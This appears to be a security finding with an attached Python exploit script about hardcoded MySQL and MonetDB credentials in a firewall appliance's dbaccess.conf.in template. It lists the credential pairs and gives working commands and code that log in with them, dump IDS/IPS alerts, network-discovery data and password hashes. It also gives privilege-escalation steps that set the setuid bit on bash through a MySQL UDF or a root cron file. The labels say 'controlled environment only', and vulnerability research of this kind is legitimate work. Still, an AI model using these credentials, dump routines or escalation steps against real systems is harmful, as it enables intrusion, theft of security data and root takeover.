"""
F-FTD-77 (UPGRADED): Hardcoded database credentials in dbaccess.conf.in
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /etc/sf/dbaccess.conf.in (template for runtime /etc/sf/dbaccess.conf):
  Comment in file: "NEW ENTRIES ADDED HERE WILL NOT BE RANDOMIZED.
  RANDOMIZATION SHOULD BE DONE IN FIRSTBOOT AND UPGRADE SCRIPTS."

  This note confirms that credentials in this template file are NOT randomized
  by the template mechanism itself — randomization requires firstboot to work.
  If firstboot credential randomization fails, is incomplete, or is not yet
  run (pre-firstboot image), these exact credentials exist on deployed FTD.

  CONFIRMED HARDCODED CREDENTIALS:
    MySQL:
      root:admin          — MySQL root (FULL DATABASE ACCESS)
      interface:interface — MySQL interface account (network config DB)
      barnyard:barnyard   — MySQL barnyard (Snort alert storage, sfsnort DB)
      correlator:correlator — MySQL correlator (SFDataCorrelator event correlation)
      external:external   — MySQL external (external data feeds)
      etel_sys:lo3c2a3te  — MySQL etel_sys (URL telemetry, unique password)

    MonetDB:
      monetdb:monetdb123  — MonetDB admin (columnar event analytics DB)
      eventdb_user:eventdb123 — MonetDB event database user

  Also confirmed via ims-data.conf (already F-FTD-59):
    barnyard:barnyard — appears in BOTH dbaccess.conf.in AND ims-data.conf
    sfsnort database — Snort alert events accessible via barnyard credentials

ATTACK SURFACE:
  From a www shell (post F-FTD-67, F-FTD-78, or other):

  MySQL root access:
    mysql -u root -padmin -h 127.0.0.1 sfsnort -e "SELECT * FROM events LIMIT 10;"
    → All IDS/IPS alert events (source IP, dest IP, rule triggered, packet data)
    mysql -u root -padmin -h 127.0.0.1 -e "SELECT User,Password FROM mysql.user;"
    → All MySQL user hashes → crack offline
    mysql -u root -padmin -h 127.0.0.1 -e "SHOW DATABASES;"
    → All database names (sfsnort, rna, etc.)

  SFDataCorrelator database:
    mysql -u correlator -pcorrelator -h 127.0.0.1 -e "SHOW DATABASES;"
    → Event correlation data, network discovery, host profiles

  RNA (Network Discovery) database:
    mysql -u root -padmin -h 127.0.0.1 rna -e "SHOW TABLES;"
    → All discovered hosts, services, OS fingerprints, network topology

  MonetDB access:
    monetdb connect -h 127.0.0.1 -u monetdb -p monetdb123 eventdb
    → Full analytics event stream (connection events, file events, IPS alerts)

  Data accessible via MySQL root:
    - sfsnort: All Snort IDS/IPS alerts with packet data (intrusion events)
    - rna: Full network topology and host discovery (what's on the network)
    - SFDataCorrelator tables: AMP file verdicts, URL categorization results
    - All other FTD databases: system config, backup data, rule updates

PRIVILEGE ESCALATION VIA MYSQL:
  MySQL running as root via sudo:
    sudo /usr/bin/mysql -u root -padmin (NOTE: no sudo mysql entry in sudoers)

  ALTERNATIVE — MySQL UDF:
    With MySQL root access, load a user-defined function (UDF) via:
      SELECT sys_exec('chmod u+s /bin/bash');
    Requires UDF binary loadable into MySQL's plugin_dir.
    IF MySQL runs as root (or if plugin_dir is writable), this is RCE.
    Check: SELECT user(); → if 'root@localhost', UDF approach viable.

  MORE RELIABLE: MySQL root → write to /etc/cron.d (if plugin_dir writable
  by MySQL and outfile allowed):
    SELECT "* * * * * root chmod u+s /bin/bash" INTO OUTFILE '/etc/cron.d/sf-bg';
    → Requires secure_file_priv='', which may not be set

  Best path: use root:admin for data exfiltration; use F-FTD-73/85 for root

VERIFICATION (controlled environment):
  # Check if MySQL credentials are still default (not randomized):
  mysql -u root -padmin -h 127.0.0.1 -e "SELECT VERSION();"
  # If connection succeeds: credentials are NOT randomized

  # Check database list:
  mysql -u root -padmin -h 127.0.0.1 -e "SHOW DATABASES;"

  # Dump Snort alert events:
  mysql -u barnyard -pbarnyard -h 127.0.0.1 sfsnort \
    -e "SELECT COUNT(*) FROM event;" 2>/dev/null

  # Check MonetDB:
  echo "\\l" | monetdb -h 127.0.0.1 -u monetdb -p monetdb123 2>/dev/null

Affected: FTD 6.7.0-65 (dbaccess.conf.in confirmed; randomization not guaranteed)
Severity: HIGH — full database read access to all FTD event data, network discovery,
          IDS/IPS alerts, and system configuration tables; MySQL root on default
          credentials if firstboot randomization did not run
Auth required: www shell (post F-FTD-67, F-FTD-78, or equivalent)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import subprocess

# Static credentials from /etc/sf/dbaccess.conf.in
MYSQL_CREDS = [
    ("root",        "admin",        "sfsnort",      "MySQL root — FULL ACCESS"),
    ("interface",   "interface",    "interface_db", "MySQL interface — network config"),
    ("barnyard",    "barnyard",     "sfsnort",      "MySQL barnyard — Snort alert storage"),
    ("correlator",  "correlator",   "correlator",   "MySQL correlator — event correlation"),
    ("external",    "external",     "external",     "MySQL external — data feeds"),
    ("etel_sys",    "lo3c2a3te",    "etel",         "MySQL etel_sys — URL telemetry"),
]

MONETDB_CREDS = [
    ("monetdb",      "monetdb123",  "eventdb",      "MonetDB admin"),
    ("eventdb_user", "eventdb123",  "eventdb",      "MonetDB event database"),
]

MYSQL_HOST = "127.0.0.1"
MYSQL_PORT = 3306


def test_mysql_creds(host=MYSQL_HOST, port=MYSQL_PORT):
    """
    Test all MySQL credentials from dbaccess.conf.in.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-77: Testing MySQL credentials on {host}:{port}")
    print(f"    Source: /etc/sf/dbaccess.conf.in")
    print()

    confirmed = []
    for user, pw, db, desc in MYSQL_CREDS:
        cmd = [
            "mysql", "-u", user, f"-p{pw}",
            f"-h{host}", f"-P{port}",
            "-e", "SELECT VERSION();",
            "--connect-timeout=5", "--silent"
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
            if result.returncode == 0:
                version = result.stdout.strip()
                print(f"[!!!] CONFIRMED: {user}:{pw} → {desc}")
                print(f"      MySQL version: {version}")
                confirmed.append((user, pw, db, desc))
            else:
                err = result.stderr.strip()[:80]
                print(f"[-] FAILED: {user}:{pw} → {err}")
        except FileNotFoundError:
            print(f"[!] mysql client not installed. Verify manually:")
            print(f"    mysql -u {user} -p{pw} -h{host} -e 'SELECT VERSION();'")
            break
        except Exception as e:
            print(f"[-] Error testing {user}: {e}")

    print()
    print(f"[*] Summary: {len(confirmed)}/{len(MYSQL_CREDS)} MySQL credentials confirmed")
    return confirmed


def dump_databases(user="root", pw="admin", host=MYSQL_HOST):
    """
    Dump database list and table counts using root credentials.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-77: Enumerating databases as root:{pw} on {host}")
    cmd = ["mysql", "-u", user, f"-p{pw}", f"-h{host}", "-e", "SHOW DATABASES;", "--silent"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            dbs = result.stdout.strip().split('\n')
            print(f"[!!!] {len(dbs)} databases found:")
            for db in dbs:
                print(f"      {db}")

            # Get table count per db
            for db in dbs:
                if db in ('information_schema', 'performance_schema', 'mysql'):
                    continue
                count_cmd = ["mysql", "-u", user, f"-p{pw}", f"-h{host}", db,
                            "-e", "SHOW TABLES;", "--silent"]
                count_result = subprocess.run(count_cmd, capture_output=True, text=True, timeout=5)
                if count_result.returncode == 0:
                    tables = count_result.stdout.strip().split('\n')
                    print(f"      {db}: {len(tables)} tables")
            return dbs
        else:
            print(f"[-] Failed: {result.stderr.strip()[:100]}")
            return []
    except Exception as e:
        print(f"[-] Error: {e}")
        return []


def dump_snort_events(limit=20, user="barnyard", pw="barnyard", host=MYSQL_HOST):
    """
    Dump recent Snort IDS/IPS events from sfsnort database.
    CONTROLLED ENVIRONMENT ONLY.
    """
    query = f"""SELECT e.sid, e.cid, sig.sig_name, iphdr.ip_src, iphdr.ip_dst,
               e.timestamp FROM event e
               JOIN signature sig ON e.signature = sig.sig_id
               JOIN iphdr ON e.sid = iphdr.sid AND e.cid = iphdr.cid
               ORDER BY e.cid DESC LIMIT {limit};"""
    print(f"[*] F-FTD-77: Dumping last {limit} Snort events from sfsnort")
    cmd = ["mysql", "-u", user, f"-p{pw}", f"-h{host}", "sfsnort",
           "-e", query, "--silent"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            print(f"[!!!] Snort event data:")
            print(result.stdout[:2000])
        else:
            print(f"[-] Failed: {result.stderr.strip()[:100]}")
    except Exception as e:
        print(f"[-] Error: {e}")


def print_all_creds():
    """Print all extracted credential pairs."""
    print("""
F-FTD-77: Database Credentials from /etc/sf/dbaccess.conf.in
=============================================================

MySQL (localhost:3306):
  user=root            pass=admin          db=all      [MYSQL ROOT]
  user=interface       pass=interface      db=interface_db
  user=barnyard        pass=barnyard       db=sfsnort  [Snort alerts]
  user=correlator      pass=correlator     db=correlator [event correlation]
  user=external        pass=external       db=external
  user=etel_sys        pass=lo3c2a3te      db=etel     [URL telemetry]

MonetDB (localhost:50000):
  user=monetdb         pass=monetdb123     db=eventdb  [analytics admin]
  user=eventdb_user    pass=eventdb123     db=eventdb  [event data]

NOTE: File comment says randomization done by firstboot scripts, NOT by template.
      If firstboot randomization failed/incomplete: above creds work on live FTD.
      barnyard:barnyard also in ims-data.conf (F-FTD-59 cross-reference).

Data accessible via root:admin:
  - sfsnort: All IDS/IPS alert events with packet headers and signatures
  - rna: All network discovery (host profiles, OS fingerprints, open services)
  - correlator: AMP file verdicts, URL categories, event correlation results
  - mysql.user: All MySQL user password hashes (crack offline)
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-77 (UPGRADED): Hardcoded DB credentials in dbaccess.conf.in")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print_all_creds()

    elif mode == "test":
        host = sys.argv[2] if len(sys.argv) > 2 else MYSQL_HOST
        test_mysql_creds(host)

    elif mode == "enum":
        host = sys.argv[2] if len(sys.argv) > 2 else MYSQL_HOST
        dump_databases(host=host)

    elif mode == "events":
        host = sys.argv[2] if len(sys.argv) > 2 else MYSQL_HOST
        limit = int(sys.argv[3]) if len(sys.argv) > 3 else 20
        dump_snort_events(limit=limit, host=host)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
